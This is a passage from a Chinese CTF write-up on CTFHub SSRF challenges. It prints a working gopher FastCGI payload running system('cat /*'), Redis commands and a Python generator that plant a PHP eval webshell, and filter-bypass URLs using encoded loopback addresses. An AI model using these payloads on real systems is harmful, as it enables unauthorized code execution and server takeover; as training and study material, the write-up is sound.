alt=81ec4d09419fae680fca1b04163c0076_MD5></a></figure></p><p>获得如下payload：</p><p><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27cat%20/%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</code></p><p>经过二次编码（这里需要进行两次编码，因为这里GET会进行一次解码，curl也会再进行一次解码）（不知道怎么回事我只用进行一次编码，可能工具升级了？？？）：</p><p><code>gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%25F6%2506%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH58%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2509SCRIPT_FILENAMEindex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253A%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2F%252A%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122709.jpg title=d8eea9c2296fec9c5548ad37b3ce6ddf_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122709.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122709.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122709.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122709.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122709.jpg 2x" sizes=auto alt=d8eea9c2296fec9c5548ad37b3ce6ddf_MD5></a></figure></p><h2 id=ctfhub-ssrf-redis协议 class=headerLink><a href=#ctfhub-ssrf-redis%e5%8d%8f%e8%ae%ae class=header-mark></a>CTFHUB SSRF Redis协议</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122710.jpg title=a284f28c21e17ffe52847e1f620767a8_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122710.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122710.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122710.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122710.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122710.jpg 2x" sizes=auto alt=a284f28c21e17ffe52847e1f620767a8_MD5></a></figure></p><blockquote><p>主要是利用Redis未授权访问，实现像目标主机写入Webshell、SSH公钥，或写入计划任务实现反弹shell。</p><p>Redis是一个key-value存储系统。Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。</p><p>Redis 在默认情况下，会绑定在 <strong>0.0.0.0:6379</strong>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。，也可以直接写入Webshell或者写入计划任务进行反弹shell。</p></blockquote><p>扫了下目录没东西，既然是Redis，那么应该就是利用SSRF对目标主机上的Redis进行未授权访问攻击。</p><p>进行端口扫描，题目提示 Redis 默认在 6379 端口，那么我们扫描 6000-7000 试试看</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122711.jpg title=d2a6381bb882b554e72d68ab67f92eac_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122711.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122711.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122711.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122711.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122711.jpg 2x" sizes=auto alt=d2a6381bb882b554e72d68ab67f92eac_MD5></a></figure></p><p>可以看到 6379 端口返回包发现 Redis 报错，说明目标主机上确实运行着Redis服务，并且端口为其默认端口6379。</p><p>利用未授权访问攻击Redis的方法有很多，我们可以写webshell、反弹shell，也可以写ssh公钥，这里我们用写webshell的方法。</p><h3 id=法1 class=headerLink><a href=#%e6%b3%951 class=header-mark></a>法1</h3><p>还是使用 Gopherus 工具，用 Redis 协议</p><p><code>python2 gopherus.py --exploit redis</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122712.jpg title=3b501b1b8caa7587c518e48460d2a0e2_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122712.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122712.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122712.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122712.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122712.jpg 2x" sizes=auto alt=3b501b1b8caa7587c518e48460d2a0e2_MD5></a></figure></p><p>将得到的 payload 进行二次编码，赋值给 url 后发现 504 超时，但是其实木马已经写入了</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122713.jpg title=fd647c9e97c9d5971822d7234ebb641d_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122713.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122713.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122713.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122713.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122713.jpg 2x" sizes=auto alt=fd647c9e97c9d5971822d7234ebb641d_MD5></a></figure></p><p>用蚁剑链接后找到根目录下 flag</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122714.jpg title=3e0d6407bc58b687e709587dd44a86a2_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122714.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122714.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122714.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122714.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122714.jpg 2x" sizes=auto alt=3e0d6407bc58b687e709587dd44a86a2_MD5></a></figure></p><h3 id=法2 class=headerLink><a href=#%e6%b3%952 class=header-mark></a>法2</h3><p>利用Redis来写webshell</p><p>redis命令：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>flushall
</span></span><span class=line><span class=cl><span class=nb>set</span> <span class=m>1</span> <span class=s1>&#39;&lt;?php eval($_GET[&#34;cmd&#34;]);?&gt;&#39;</span>
</span></span><span class=line><span class=cl>config <span class=nb>set</span> dir /var/www/html
</span></span><span class=line><span class=cl>config <span class=nb>set</span> dbfilename shell.php
</span></span><span class=line><span class=cl>save
</span></span></code></pre></div><p>直接用 py 脚本得到二次编码后的 payload</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>import</span><span class=w> </span><span class=nn>urllib</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>from</span><span class=w> </span><span class=n>urllib</span><span class=w> </span><span class=kn>import</span><span class=w> </span><span class=nn>parse</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>protocol</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;gopher://&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>ip</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;127.0.0.1&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>port</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;6379&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>shell</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;\n\n&lt;?php eval($_GET[\&#34;cmd\&#34;]);?&gt;\n\n&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>filename</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;shell.php&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>path</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;/var/www/html&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>passwd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>[</span><span class=s>&#34;flushall&#34;</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>       </span><span class=s>&#34;set 1 {}&#34;</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>shell</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=s>&#34; &#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;${IFS}&#34;</span><span class=p>)),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>       </span><span class=s>&#34;config set dir {}&#34;</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>path</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>       </span><span class=s>&#34;config set dbfilename {}&#34;</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>filename</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>       </span><span class=s>&#34;save&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>       </span><span class=o>]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=n>passwd</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>cmd</span><span class=p>.</span><span class=na>insert</span><span class=p>(</span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=s>&#34;AUTH {}&#34;</span><span class=p>.</span><span class=na>format</span><span class=p>(</span><span class=n>passwd</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>payload_prefix</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>protocol</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>ip</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;:&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>port</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/_&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>CRLF</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;\r\n&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>def</span><span class=w> </span><span class=nf>redis_format</span><span class=p>(</span><span class=n>arr</span><span class=p>):</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>redis_arr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>arr</span><span class=p>.</span><span class=na>split</span><span class=p>(</span><span class=s>&#34; &#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>cmd_</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>cmd_</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=s>&#34;*&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>str</span><span class=p>(</span><span class=n>len</span><span class=p>(</span><span class=n>redis_arr</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=n>x_</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=n>redis_arr</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>cmd_</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>CRLF</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;$&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>str</span><span class=p>(</span><span class=n>len</span><span class=p>((</span><span class=n>x_</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=s>&#34;${IFS}&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34; &#34;</span><span class=p>))))</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>CRLF</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>x_</span><span class=p>.</span><span class=na>replace</span><span class=p>(</span><span class=s>&#34;${IFS}&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34; &#34;</span><span class=p>)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>cmd_</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>CRLF</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>cmd_</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=w> </span><span class=n>__name__</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=s>&#34;__main__&#34;</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=n>x</span><span class=w> </span><span class=n>in</span><span class=w> </span><span class=n>cmd</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>payload</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>parse</span><span class=p>.</span><span class=na>quote</span><span class=p>(</span><span class=n>redis_format</span><span class=p>(</span><span class=n>x</span><span class=p>))</span><span class=w>  </span><span class=err>#</span><span class=w> </span><span class=n>url编码</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>payload_prefix</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>parse</span><span class=p>.</span><span class=na>quote</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=w>  </span><span class=err>#</span><span class=w> </span><span class=n>再次url编码</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nf>print</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></div><h2 id=ctfhub-ssrf-url-bypass class=headerLink><a href=#ctfhub-ssrf-url-bypass class=header-mark></a>CTFHUB SSRF <strong>URL Bypass</strong></h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122715.jpg title=c60df26906f33d6500b4fd7bcec1498e_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122715.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122715.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122715.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122715.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122715.jpg 2x" sizes=auto alt=c60df26906f33d6500b4fd7bcec1498e_MD5></a></figure></p><p>说url必须以 “<code>http://notfound.ctfhub.com</code>” 开头。我们可以利用@来绕过，如 <code>http://whoami@127.0.0.1</code>实际上是以用户名 <code>whoami</code> 连接到站点<code>127.0.0.1</code>，即 <code>http://notfound.ctfhub.com@127.0.0.1</code>与 <code>http://127.0.0.1</code>请求是相同的，该请求得到的内容都是<code>127.0.0.1</code>的内容。</p><p>我们扫描目录，发现了flag.php，构造如下payload即可绕过限制访问flag.php：</p><p><code>http://notfound.ctfhub.com@127.0.0.1/flag.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122716.jpg title=915a97e25e76a3a77e3f2ae9b00f0eae_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122716.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122716.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122716.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122716.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122716.jpg 2x" sizes=auto alt=915a97e25e76a3a77e3f2ae9b00f0eae_MD5></a></figure></p><h2 id=ctfhub-ssrf-数字ip-bypass class=headerLink><a href=#ctfhub-ssrf-%e6%95%b0%e5%ad%97ip-bypass class=header-mark></a><strong>CTFHUB SSRF 数字IP Bypass</strong></h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122717.jpg title=9adb1f9a2422c8e41994a894ed395f41_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122717.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122717.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122717.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122717.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122717.jpg 2x" sizes=auto alt=9adb1f9a2422c8e41994a894ed395f41_MD5></a></figure></p><p>绕过127.0.0.1的方法有很多，如下给出几个实例：</p><h3 id=利用进制转换 class=headerLink><a href=#%e5%88%a9%e7%94%a8%e8%bf%9b%e5%88%b6%e8%bd%ac%e6%8d%a2 class=header-mark></a>利用进制转换</h3><p>php进制转换脚本：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>&lt;?</span><span class=n>php</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>$ip</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=err>&#39;</span><span class=n>127</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>1</span><span class=err>&#39;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>$ip</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>explode</span><span class=p>(</span><span class=sc>&#39;.&#39;</span><span class=p>,</span><span class=n>$ip</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>$r</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>$ip</span><span class=o>[</span><span class=n>0</span><span class=o>]</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>24</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>$ip</span><span class=o>[</span><span class=n>1</span><span class=o>]</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>16</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=p>(</span><span class=n>$ip</span><span class=o>[</span><span class=n>2</span><span class=o>]</span><span class=w> </span><span class=o>&lt;&lt;</span><span class=w> </span><span class=n>8</span><span class=p>)</span><span class=w> </span><span class=o>|</span><span class=w> </span><span class=n>$ip</span><span class=o>[</span><span class=n>3</span><span class=o>]</span><span class=w> </span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>if</span><span class=p>(</span><span class=n>$r</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>$r</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>4294967296</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>echo</span><span class=w> </span><span class=s>&#34;十进制:&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>echo</span><span class=w> </span><span class=n>$r</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>echo</span><span class=w> </span><span class=s>&#34;八进制:&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>echo</span><span class=w> </span><span class=nf>decoct</span><span class=p>(</span><span class=n>$r</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>echo</span><span class=w> </span><span class=s>&#34;十六进制:&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>echo</span><span class=w> </span><span class=nf>dechex</span><span class=p>(</span><span class=n>$r</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?&gt;</span><span class=w>
</span></span></span></code></pre></div><p>得到：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=n>127</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>1</span><span class=p>:</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>八进制</span><span class=err>：</span><span class=n>0177</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>十六进制</span><span class=err>：</span><span class=n>0x7f</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>0</span><span class=p>.</span><span class=na>1</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>十进制</span><span class=err>：</span><span class=n>2130706433</span><span class=w>
</span></span></span></code></pre></div><p>因此也可以这样写payload：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//2130706433/flag.php</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//0x7f.0.0.1/flag.php</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//0177.0.0.1/flag.php</span><span class=w>
</span></span></span></code></pre></div><h3 id=利用其他各种指向127001的地址 class=headerLink><a href=#%e5%88%a9%e7%94%a8%e5%85%b6%e4%bb%96%e5%90%84%e7%a7%8d%e6%8c%87%e5%90%91127001%e7%9a%84%e5%9c%b0%e5%9d%80 class=header-mark></a>利用其他各种指向127.0.0.1的地址</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//localhost/</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//0/</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//0.0.0.0/flag.php</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//127.1/flag.php</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=o>?</span><span class=n>url</span><span class=o>=</span><span class=n>http</span><span class=p>:</span><span class=c1>//sudo.cc/flag.php    //302跳转</span><span class=w>
</span></span></span></code></pre></div><h2 id=ctfhub-ssrf-302跳转-bypass class=headerLink><a href=#ctfhub-ssrf-302%e8%b7%b3%e8%bd%ac-bypass class=header-mark></a><strong>CTFHUB SSRF 302跳转 Bypass</strong></h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122718.jpg title=7e25871c7e88520e8bff47f3969d740d_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122718.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122718.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122718.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122718.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122718.jpg 2x" sizes=auto alt=7e25871c7e88520e8bff47f3969d740d_MD5></a></figure></p><p>扫描目录发现flag.php，直接访问它，说必须从目标机本地访问，所以我们构造<code>?url=http://127.0.0.1/flag.php</code>，发现被检测了</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122719.jpg title=2c301a463b7c92ef8213aebd1d582fab_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122719.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122719.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122719.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122719.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122719.jpg 2x" sizes=auto alt=2c301a463b7c92ef8213aebd1d582fab_MD5></a></figure></p><p>题目提示 302 跳转，302 跳转就是由一个URL跳转到另外一个URL当中去，就比如一个网站的网址更新了，一部分的用户还不知道，就可以使用302跳转，从旧的网址跳转到新的网址上，按照这个思路，我们需要实现另外一种表达方式绕过<code>127.0.0.1/flag.php</code>。</p><p>这边<code>xip.io</code>和各种短网址生成都不能用，故用上一题解法</p><p>发现<code>sudo.cc</code>可以用，<code>?url=http://sudo.cc/flag.php</code></p><h2 id=ctfhub-ssrf-dns重绑定-bypass class=headerLink><a href=#ctfhub-ssrf-dns%e9%87%8d%e7%bb%91%e5%ae%9a-bypass class=header-mark></a><strong>CTFHUB SSRF DNS重绑定 Bypass</strong></h2><p><figure><a class=lightgallery 